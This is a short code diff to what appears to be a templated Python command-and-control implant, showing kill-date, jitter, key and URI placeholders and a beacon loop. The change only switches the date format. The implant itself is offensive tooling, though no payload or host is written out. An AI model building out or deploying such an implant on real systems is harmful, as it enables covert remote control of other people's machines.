@@ -12,7 +12,7 @@ hh[0] = [%s]
 timer = parse_sleep_time("%s".strip())
 icoimage = [%s]
 urls = [%s]
-kd=time.strptime("%s","%%d/%%m/%%Y")
+kd=time.strptime("%s","%%Y-%%m-%%d")
 useragent = ""
 imbase = "%s"
 jitter = %s
@@ -91,7 +91,7 @@ def decrypt_bytes_gzip(key, data):
   return data
 
 while(True):
-  cstr=time.strftime("%%d/%%m/%%Y",time.gmtime());cstr=time.strptime(cstr,"%%d/%%m/%%Y")
+  cstr=time.strftime("%%Y-%%m-%%d",time.gmtime());cstr=time.strptime(cstr,"%%Y-%%m-%%d")
   if cstr < kd:
     key = "%s"
     uri = "%s"
